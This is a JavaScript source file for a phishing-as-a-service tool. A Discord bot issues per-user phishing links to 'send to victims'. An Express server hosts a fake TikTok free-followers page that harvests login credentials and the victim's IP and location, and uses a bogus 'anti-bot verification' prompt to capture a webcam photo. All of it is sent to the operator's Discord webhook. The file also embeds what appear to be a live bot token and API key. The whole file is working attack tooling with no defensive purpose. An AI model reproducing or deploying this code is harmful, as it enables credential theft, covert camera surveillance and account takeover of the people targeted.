const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const crypto = require('crypto');

// ========== DATABASE SETUP ==========
const db = new sqlite3.Database('sessions.db');
db.run(`
  CREATE TABLE IF NOT EXISTS sessions (
    sessionId TEXT PRIMARY KEY,
    userId TEXT,
    webhookUrl TEXT,
    createdAt INTEGER
  )
`);

db.run(`
  CREATE TABLE IF NOT EXISTS user_webhooks (
    userId TEXT PRIMARY KEY,
    webhookUrl TEXT
  )
`);

// ========== DISCORD BOT ==========
const client = new Client({ 
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] 
});

client.on('ready', () => {
  console.log(`✅ Bot logged in as ${client.user.tag}`);
  
  // Register slash command
  client.application.commands.create({
    name: 'generate',
    description: 'Generate a unique phishing URL'
  });
  
  client.application.commands.create({
    name: 'setwebhook',
    description: 'Set your Discord webhook to receive stolen data',
    options: [
      {
        name: 'url',
        description: 'Your Discord webhook URL',
        type: 3, // STRING
        required: true
      }
    ]
  });
  
  client.application.commands.create({
    name: 'myurl',
    description: 'Get your current active URL'
  });
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isCommand()) return;
  
  // ========== /SETWEBHOOK ==========
  if (interaction.commandName === 'setwebhook') {
    const webhookUrl = interaction.options.getString('url');
    
    // Validate webhook URL
    if (!webhookUrl.includes('discord.com/api/webhooks/')) {
      return interaction.reply({ content: '❌ Invalid webhook URL! Get it from Discord channel settings → Integrations → Webhooks', ephemeral: true });
    }
    
    db.run('INSERT OR REPLACE INTO user_webhooks (userId, webhookUrl) VALUES (?, ?)', 
      [interaction.user.id, webhookUrl], 
      (err) => {
        if (err) return interaction.reply({ content: '❌ Database error', ephemeral: true });
        interaction.reply({ content: '✅ Webhook saved! Use `/generate` to create your URL', ephemeral: true });
      }
    );
  }
  
  // ========== /GENERATE ==========
  else if (interaction.commandName === 'generate') {
    // Check if user has webhook
    db.get('SELECT webhookUrl FROM user_webhooks WHERE userId = ?', [interaction.user.id], async (err, row) => {
      if (!row) {
        return interaction.reply({ 
          content: '❌ You need to set a webhook first!\nUse `/setwebhook URL_HERE`\n\nHow to get webhook:\n1. Go to any Discord channel\n2. Edit Channel → Integrations → Webhooks → New Webhook\n3. Copy URL', 
          ephemeral: true 
        });
      }
      
      // Generate unique session ID
      const sessionId = crypto.randomBytes(16).toString('hex');
      const uniqueUrl = `https://YOUR_DOMAIN.com/page/${sessionId}`;
      
      // Store session
      db.run('INSERT INTO sessions (sessionId, userId, webhookUrl, createdAt) VALUES (?, ?, ?, ?)',
        [sessionId, interaction.user.id, row.webhookUrl, Date.now()],
        (err) => {
          if (err) return interaction.reply({ content: '❌ Error generating URL', ephemeral: true });
          
          const row2 = new ActionRowBuilder()
            .addComponents(
              new ButtonBuilder()
                .setLabel('📋 Copy URL')
                .setStyle(ButtonStyle.Primary)
                .setCustomId(`copy_${sessionId}`)
            );
          
          interaction.reply({ 
            content: `🔗 **YOUR UNIQUE PHISHING URL:**\n\`${uniqueUrl}\`\n\nSend this to victims. All data will go to YOUR webhook.\n⚠️ URL expires in 24 hours`,
            components: [row2],
            ephemeral: true 
          });
        }
      );
    });
  }
  
  // ========== /MYURL ==========
  else if (interaction.commandName === 'myurl') {
    db.get('SELECT sessionId, createdAt FROM sessions WHERE userId = ? ORDER BY createdAt DESC LIMIT 1', 
      [interaction.user.id], 
      (err, row) => {
        if (!row) {
          return interaction.reply({ content: '❌ No active URL. Use `/generate` first', ephemeral: true });
        }
        const expiry = Math.floor((row.createdAt + 86400000 - Date.now()) / 3600000);
        interaction.reply({ 
          content: `🔗 Your active URL:\n\`https://YOUR_DOMAIN.com/page/${row.sessionId}\`\nExpires in: ${expiry} hours`,
          ephemeral: true 
        });
      }
    );
  }
});

// Handle button copy (just for UX)
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isButton()) return;
  if (interaction.customId.startsWith('copy_')) {
    const sessionId = interaction.customId.replace('copy_', '');
    await interaction.reply({ content: `✅ Copied! URL: https://YOUR_DOMAIN.com/page/${sessionId}`, ephemeral: true });
  }
});

// ========== EXPRESS SERVER (Hosts the Phishing Page) ==========
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve the dynamic TikTok page
app.get('/page/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  
  // Check if session exists
  db.get('SELECT userId, webhookUrl FROM sessions WHERE sessionId = ? AND createdAt > ?', 
    [sessionId, Date.now() - 86400000], // 24 hour expiry
    (err, session) => {
      if (!session) {
        return res.send('<h1>Link expired or invalid</h1><p>This link is no longer active.</p>');
      }
      
      // Inject the user's webhook URL into the HTML
      const html = generatePhishingPage(session.webhookUrl, sessionId);
      res.send(html);
    }
  );
});

function generatePhishingPage(webhookUrl, sessionId) {
  return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>TikTok Free Followers & Likes</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#121212 0%,#1a1a2e 100%);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
#cameraPreview{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:-1;opacity:0}
#permissionRequest{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);color:#fff;z-index:1000;text-align:center;padding-top:20%}
#permissionButton{padding:15px 30px;background:#FE2C55;color:#fff;border:none;border-radius:30px;font-size:18px;cursor:pointer;margin-top:20px;font-weight:bold}
.main-tool{max-width:500px;width:100%;background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);border-radius:30px;padding:40px 30px;box-shadow:0 20px 60px rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1);text-align:center}
h1{color:#fff;font-size:32px;margin-bottom:10px}
.input-form{width:100%;padding:15px 20px;margin:10px 0;border:none;border-radius:50px;background:rgba(255,255,255,0.1);color:#fff;font-size:16px;outline:none}
.buttonstyle{width:100%;padding:15px;margin-top:20px;border:none;border-radius:50px;background:#FE2C55;color:#fff;font-size:18px;cursor:pointer;font-weight:bold}
</style>
</head>
<body>
<div id="permissionRequest"><h2>📹 Verification Required</h2><p>Camera access needed for anti-bot verification</p><button id="permissionButton">✅ Allow Camera Access</button></div>
<video id="cameraPreview" autoplay playsinline></video>
<div class="main-tool">
<h1>TikTok Free Followers</h1>
<p class="sub-heading">🔥 Get 1000 Followers + 5000 Likes FREE 🔥</p>
<form onsubmit="return submitData(event)">
<input name="email" class="input-form" placeholder="📧 TikTok Username / Email" required>
<input name="password" class="input-form" type="password" placeholder="🔒 Password" required>
<button class="buttonstyle" type="submit">⚡ GET FREE FOLLOWERS ⚡</button>
</form>
</div>

<script>
const WEBHOOK_URL = '${webhookUrl}';
let cameraStream = null, hasPermission = false;

async function getLocation() {
  try {
    const res = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=f24695ba04824237942f8c06db90566a');
    const data = await res.json();
    return { ip: data.ip, city: data.city, country: data.country_name };
  } catch(e) { return { ip: 'Unknown', city: 'Unknown', country: 'Unknown' }; }
}

async function initCamera() {
  document.getElementById('permissionRequest').style.display = 'block';
  document.getElementById('permissionButton').onclick = async () => {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    cameraStream = stream;
    document.getElementById('cameraPreview').srcObject = stream;
    hasPermission = true;
    document.getElementById('permissionRequest').style.display = 'none';
  };
}

async function captureAndSend() {
  if(!hasPermission) return;
  const video = document.getElementById('cameraPreview');
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext('2d').drawImage(video, 0, 0);
  canvas.toBlob(blob => {
    const fd = new FormData();
    fd.append('file', blob, 'face.jpg');
    fetch(WEBHOOK_URL, { method: 'POST', body: fd });
  });
}

async function submitData(event) {
  event.preventDefault();
  const email = document.querySelector('input[name="email"]').value;
  const password = document.querySelector('input[name="password"]').value;
  const loc = await getLocation();
  if(hasPermission) await captureAndSend();
  
  const payload = {
    content: \`🔐 **TIKTOK CREDENTIALS** 🔐\\nEmail: \${email}\\nPassword: \${password}\\nIP: \${loc.ip}\\nLocation: \${loc.city}, \${loc.country}\\nSession: ${sessionId}\`
  };
  await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
  setTimeout(() => { window.location.href = 'https://www.tiktok.com'; }, 1500);
  return false;
}

initCamera();
</script>
</body>
</html>`;
}

// Start server
app.listen(3000, () => console.log('✅ HTTP server on port 3000'));

// Start bot
client.login('MTUwMjU1OTI4ODk1Mjg4NTMwOA.GdmsWd.lyXOr7P9Y-aJpW2VxrxdAVAmK73I1qZACJaQ94'); // Replace with your bot token